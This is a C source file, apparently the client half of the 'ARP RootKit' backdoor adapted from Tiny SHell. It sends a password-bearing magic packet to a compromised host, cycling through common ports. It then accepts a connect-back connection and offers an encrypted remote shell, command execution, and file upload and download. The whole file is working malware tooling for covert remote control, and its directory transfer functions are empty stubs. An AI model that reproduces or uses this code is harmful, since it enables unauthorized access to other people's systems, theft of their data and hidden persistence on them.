/***
 *      _  __  __     __
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_
 *
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * Tiny SHell version 0.6 - client side,
 * by Christophe Devine <devine@cr0.net>;
 * this program is licensed under the GPL.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "rshell.h"
#include "pel.h"

unsigned char message[BUFSIZE + 1];
extern char *optarg;
extern int optind;

char *localpath = NULL, *remotepath = NULL, workmode = 's', *host = NULL, *cmd = NULL, *password = NULL, *localaddr = NULL;
unsigned short localport = 0, remoteport = 0;

/*
 * Function declaration
 */
int send_magic_request(unsigned short port);
int wait_connection(void);
int get_file(int client);
int put_file(int client);
int get_dir(int client);
int put_dir(int client);
int run_cmd(int client);
int run_shell(int client);
void usage(char *argv0);
void pel_error(char *s);

/*
 * Program entry point
 */
int main(int argc, char *argv[]) {
    int ret = 0, sock = 0, opt = 0;
	unsigned short port = 0, common_ports[] = {80, 443, 22, 25, 21, 110, 445, 0};

    while ((opt = getopt(argc, argv, "h:L:p:P:d::u::D::U::l:r:c:s::")) != -1) {
        switch (opt) {
			case 'h':
				host = optarg;
				break;
            case 'p':
                remoteport = atoi(optarg);
                if (!remoteport) {
					fprintf(stderr, "Bad port format.\n");
					return -1;
				}
                break;
			case 'P':
				localport = atoi(optarg);
				if (!localport) {
					fprintf(stderr, "Bad port format.\n");
					return -1;
				}
				break;
			case 'L':
				localaddr = optarg;
				break;
            case 'd':
				workmode = 'd';
                break;
			case 'u':
				workmode = 'u';
				break;
			case 'D':
				workmode = 'D';
				break;
			case 'U':
				workmode = 'U';
				break;
			case 's':
				workmode = 's';
				break;
			case 'l':
				localpath = optarg;
				break;
			case 'r':
				remotepath = optarg;
				break;
			case 'c':
				workmode = 'c';
				cmd = optarg;
				break;
            default:
                usage(*argv);
                break;
        }
    }

	if (host == NULL) {
		usage(*argv);
	}

	switch(workmode) {
		case 'd':
		case 'u':
		case 'D':
		case 'U':
			if (!localpath || !remotepath) {
				fprintf(stderr, "You must choose a local and remote path.\n");
				usage(*argv);
			}
			break;
		default:
			break;
	}

	password = getpass("Password: ");
	
	if (remoteport) {
		ret = send_magic_request(remoteport);
	} else {
		ret = -1;
		for (port = 0; common_ports[port] && ret; port++) {
			ret = send_magic_request(common_ports[port]);
		}
	}
	if (ret) {
		fprintf(stderr, "Sorry, can't send_magic_request().\n");
		return -1;
	}

	sock = wait_connection();
	if (sock < 0) {
		fprintf(stderr, "Sorry, can't wait_connection().\n");
		return -1;
	}

	switch(workmode) {
		case 'd':
			ret = get_file(sock);
			break;
		case 'u':
			ret = put_file(sock);
			break;
		case 'D':
			ret = get_dir(sock);
			break;
		case 'U':
			ret = put_dir(sock);
			break;
		case 's':
			ret = run_shell(sock);
			break;
		case 'c':
			ret = run_cmd(sock);
			break;
		default:
			fprintf(stderr, "Unknown workmode.\n");
			ret = -1;
			break;
	}

	close(sock);
	
	return ret;
}

int send_magic_request(unsigned short port) {
	int sock = 0, ret = 0;
	struct hostent *he = NULL;
	struct sockaddr_in sock_addr;
	struct rshell_req req;

	memset(&sock_addr, 0, sizeof(sock_addr));
	memset(&req, 0, sizeof(req));

	/* create a socket */
	sock = socket(AF_INET, SOCK_STREAM, 0);

	if (sock < 0) {
		perror("socket");
		return -1;
	}

	he = gethostbyname(host);

	if (he == NULL) {
		perror("gethostbyname");
		return -1;
	}

	memcpy((void *) &sock_addr.sin_addr, (void *) he->h_addr, he->h_length);

	sock_addr.sin_family = AF_INET;
	sock_addr.sin_port = htons(port);

	/* connect to the remote host */
	printf("Trying to port %d ...\n", port);
	ret = connect(sock, (struct sockaddr *) &sock_addr, sizeof(sock_addr));

	if (ret < 0) {
		perror("connect");
		return -1;
	}
	
	/* send magic packet */
	memcpy(req.magic, RSHELL_MAGIC, sizeof(RSHELL_MAGIC));
	memcpy(req.password, password, strlen(password));
	req.reverse.sin_family = AF_INET;
	if (!localport) {
		srand(time(NULL));
		localport = (rand() % (65535 - 1024)) + 1024;
	}
	req.reverse.sin_port = htons(localport);
	if (localaddr) {
	    he = gethostbyname(localaddr);
	    if (he == NULL) {
		    perror("gethostbyname");
	        return -1;
	    }

	    memcpy((void *) &req.reverse.sin_addr, (void *) he->h_addr, he->h_length);
	}
	ret = write(sock, &req, sizeof(req));
	if (ret != sizeof(req)) {
		perror("write");
		return -1;
	}

	//close(sock);

	return 0;
}

int wait_connection(void) {
	int server = 0, client = 0, ret = 0;
	struct sockaddr_in server_addr, client_addr;

	memset(&server_addr, 0, sizeof(server_addr));
	memset(&client_addr, 0, sizeof(client_addr));

	/* create a socket */
	server = socket(AF_INET, SOCK_STREAM, 0);

	if(client < 0) {
		perror("socket");
		return -1;
	}

	/* bind the client on the port the server will connect to */
	ret = 1;
	ret = setsockopt(server, SOL_SOCKET, SO_REUSEADDR, (void *) &ret, sizeof(ret));
	if (ret < 0) {
		perror( "setsockopt" );
		return -1;
	}

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(localport);
	server_addr.sin_addr.s_addr = INADDR_ANY;

	ret = bind(server, (struct sockaddr *) &server_addr, sizeof(server_addr));
	if (ret < 0) {
		perror("bind");
		return -1;
	}

	if (listen(server, 2) < 0) {
		perror("listen");
		return -1;
	}

	printf("Waiting for the server to connect back to port %d ...\n", localport);

	ret = sizeof(client_addr);
	client = accept(server, (struct sockaddr *) &client_addr, (socklen_t *) &ret);
	if (client < 0) {
		perror("accept");
		return -1;
	}

	printf("Connected!\n\n");

	close(server);

    /* setup the packet encryption layer */
	ret = pel_client_init(client, password);
	memset(password, 0, strlen(password));
	if (ret != PEL_SUCCESS) {
		/* password invalid, exit */
		fprintf(stderr, "Authentication failed.\n");
		close(client);
		return -1;
    }

    /* send the action requested by the user */
    ret = pel_send_msg(client, (unsigned char *) &workmode, 1);
    if (ret != PEL_SUCCESS) {
		pel_error("pel_send_msg");
		close(client);
        return -1;
    }

    return client;
}

int get_file(int client) {
    int ret, len, fd, total;

    /* send remote filename */
	len = strlen(remotepath);
    ret = pel_send_msg(client, (unsigned char *) remotepath, len);
    if (ret != PEL_SUCCESS) {
        pel_error("pel_send_msg");
        return -1;
    }

    /* create local file */
    fd = creat(localpath, 0644);

    if (fd < 0) {
        perror("creat");
        return -1;
    }

    /* transfer from server */
    total = 0;
    while (1) {
        ret = pel_recv_msg(client, message, &len);

        if (ret != PEL_SUCCESS) {
            if (pel_errno == PEL_CONN_CLOSED && total > 0) {
                break;
            }

            pel_error ("pel_recv_msg");
            fprintf(stderr, "Transfer failed.\n");
            return -1;
        }

        if (write(fd, message, len) != len) {
            perror("write");
            return -1;
        }

        total += len;

        printf("%d\r", total);
        fflush(stdout);
    }

	close(fd);

    printf("%d done.\n", total);

    return 0;
}

int put_file(int client) {
    int ret, len, fd, total;

    /* send remote filename */
	len = strlen(remotepath);
    ret = pel_send_msg(client, (unsigned char *) remotepath, len);
    if (ret != PEL_SUCCESS) {
        pel_error("pel_send_msg");
        return -1;
    }

    /* open local file */
    fd = open(localpath, O_RDONLY );
    if (fd < 0) {
        perror("open");
        return -1;
    }

    /* transfer to server */
    total = 0;
    while (1) {
        len = read(fd, message, BUFSIZE);

        if (len < 0) {
            perror("read");
            return -1;
        }

        if (len == 0) {
            break;
        }

        ret = pel_send_msg(client, message, len);
        if (ret != PEL_SUCCESS) {
            pel_error("pel_send_msg");
            fprintf(stderr, "Transfer failed.\n");
            return -1;
        }

        total += len;

        printf("%d\r", total);
        fflush(stdout);
    }

    printf("%d done.\n", total);

	close(fd);

    return 0;
}

int run_cmd(int client) {
    fd_set rd;
    char *term = NULL;
    int ret = 0, len = 0, imf = 0;
    struct winsize ws;
    struct termios tp, tr;

	memset(&ws, 0, sizeof(ws));
	memset(&tp, 0, sizeof(tp));
	memset(&tr, 0, sizeof(tr));

    /* send the TERM environment variable */
    term = getenv("TERM");
    if (term == NULL) {
        term = "vt100";
    }

	//printf("TERM = %s\n", term);
    len = strlen(term);
    ret = pel_send_msg(client, (unsigned char *) term, len);
    if (ret != PEL_SUCCESS) {
        pel_error("pel_send_msg");
        return -1;
    }

    /* send the window size */
    imf = 0;
    if (isatty(0)) {
        /* set the interactive mode flag */
        imf = 1;
        if (ioctl(0, TIOCGWINSZ, &ws) < 0) {
            perror("ioctl(TIOCGWINSZ)");
            return -1;
        }
    } else {
        /* fallback on standard settings */
        ws.ws_row = 25;
        ws.ws_col = 80;
    }

    message[0] = ( ws.ws_row >> 8 ) & 0xFF;
    message[1] = ( ws.ws_row      ) & 0xFF;

    message[2] = ( ws.ws_col >> 8 ) & 0xFF;
    message[3] = ( ws.ws_col      ) & 0xFF;

    ret = pel_send_msg(client, message, 4);
    if (ret != PEL_SUCCESS) {
        pel_error("pel_send_msg");
        return -1;
    }

    /* send the system command */
    len = strlen(cmd);
    ret = pel_send_msg(client, (unsigned char *) cmd, len);
    if (ret != PEL_SUCCESS) {
        pel_error("pel_send_msg");
        return -1;
    }

    /* set the tty to RAW */
    if (isatty(1)) {
        if (tcgetattr(1, &tp) < 0) {
            perror("tcgetattr");
            return -1;
        }

        memcpy((void *) &tr, (void *)&tp, sizeof(tr));

        tr.c_iflag |= IGNPAR;
        tr.c_iflag &= ~(ISTRIP|INLCR|IGNCR|ICRNL|IXON|IXANY|IXOFF);
        tr.c_lflag &= ~(ISIG|ICANON|ECHO|ECHOE|ECHOK|ECHONL|IEXTEN);
        tr.c_oflag &= ~OPOST;

        tr.c_cc[VMIN]  = 1;
        tr.c_cc[VTIME] = 0;

        if (tcsetattr(1, TCSADRAIN, &tr) < 0) {
            perror("tcsetattr");
            return -1;
        }
    }

    /* let's forward the data back and forth */
    while (1){
        FD_ZERO(&rd);

        if (imf != 0) {
            FD_SET(0, &rd);
        }

        FD_SET(client, &rd);

        if (select(client + 1, &rd, NULL, NULL, NULL) < 0) {
            perror("select");
            ret = -1;
            break;
        }

        if (FD_ISSET(client, &rd)) {
            ret = pel_recv_msg(client, message, &len);
            if (ret != PEL_SUCCESS) {
                if (pel_errno == PEL_CONN_CLOSED) {
                    ret = 0;
                } else {
                    pel_error("pel_recv_msg");
                    ret = -1;
                }
                break;
            }

            if (write(1, message, len) != len) {
                perror("write");
                ret = -1;
                break;
            }
        }

        if (imf != 0 && FD_ISSET(0, &rd)) {
            len = read(0, message, BUFSIZE);
            if (len == 0) {
                fprintf(stderr, "stdin: end-of-file\n");
                ret = -1;
                break;
            }

            if (len < 0) {
                perror("read");
                ret = -1;
                break;
            }

            ret = pel_send_msg(client, message, len);

            if (ret != PEL_SUCCESS) {
                pel_error("pel_send_msg");
                ret = -1;
                break;
            }
        }
    }

    /* restore the terminal attributes */

    if (isatty(1)) {
        tcsetattr(1, TCSADRAIN, &tp);
    }

    return ret;
}

int run_shell(int client) {
	cmd = "/bin/bash --norc --noprofile";
	return run_cmd(client);
}

int get_dir(int client) {
	return 0;
}

int put_dir(int client) {
	return 0;
}

void pel_error(char *s) {
    switch(pel_errno) {
        case PEL_CONN_CLOSED:
            fprintf(stderr, "%s: Connection closed.\n", s);
            break;

        case PEL_SYSTEM_ERROR:
            perror(s);
            break;

        case PEL_WRONG_CHALLENGE:
            fprintf(stderr, "%s: Wrong challenge.\n", s);
            break;

        case PEL_BAD_MSG_LENGTH:
            fprintf(stderr, "%s: Bad message length.\n", s);
            break;

        case PEL_CORRUPTED_DATA:
            fprintf(stderr, "%s: Corrupted data.\n", s);
            break;

        case PEL_UNDEFINED_ERROR:
            fprintf(stderr, "%s: No error.\n", s);
            break;

        default:
            fprintf(stderr, "%s: Unknown error code.\n", s);
            break;
    }
}

void usage(char *argv0) {
    fprintf(stderr,
	"ARP RootKit Backdoor Client.\n"
	"\tadapted from Tiny-Shell.\n"
	"\n"
	"use: %s -h <host> [[option] [option args] ... [optionN] [optionN args]]\n"
	"\n"
	"options:\n"
	"-h <hostname>, connect to.\n"
	"-L <hostname>, connect-back to.\n"
	"-p <port>, connect to port. (Default: try common ports).\n"
	"-P <port>, connect-back port. (Default: random).\n"
	"-d, download a file.\n"
	"-u, upload a file.\n"
	"-D, download a directory.\n"
	"-U, upload a directory.\n"
	"-l, local file/dir.\n"
	"-r, remote file/dir.\n"
	"-s, spawn a shell. (Default).\n"
	"-c, run a command.\n"
	, argv0);

    exit(1);
}
